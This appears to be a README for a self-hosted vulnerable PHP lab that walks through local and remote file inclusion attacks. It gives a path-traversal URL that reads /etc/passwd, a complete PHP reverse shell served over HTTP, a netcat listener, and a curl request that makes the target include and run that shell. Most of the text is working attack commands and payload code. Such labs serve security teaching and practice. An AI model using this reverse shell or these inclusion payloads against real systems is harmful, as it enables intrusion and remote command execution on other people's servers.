# Setup

 - Ensure you have Docker installed
 - `git clone` this repository
 - `docker build -t lfi-rfi-example .` 
 - `docker run -p 80:80 lfi-rfi-example`

# LFI / RFI Walkthrough
LFI:
`http://localhost/index.php?view=../../../etc/passwd`

RFI:

Terminal 1
```
mkdir shell
cd shell
echo "<?php
\$ip = 'host.docker.internal'; // Replace with host IP
\$port = 4444; // Replace with your listener port
\$sock = fsockopen(\$ip, \$port);
if (\$sock) {
    while (!feof(\$sock)) {
        fwrite(\$sock, shell_exec(fgets(\$sock)));
    }
    fclose(\$sock);
}
?>" > shell.php
python -m http.server
```

Terminal 2
`nc -lnvp 4444`

Terminal 3
`docker run -p 80:80 lfi-rfi-example`

Terminal 4
`curl "http://localhost/mypage.php?view=http://host.docker.internal:8000/shell.php"`

Terminal 2 now has access
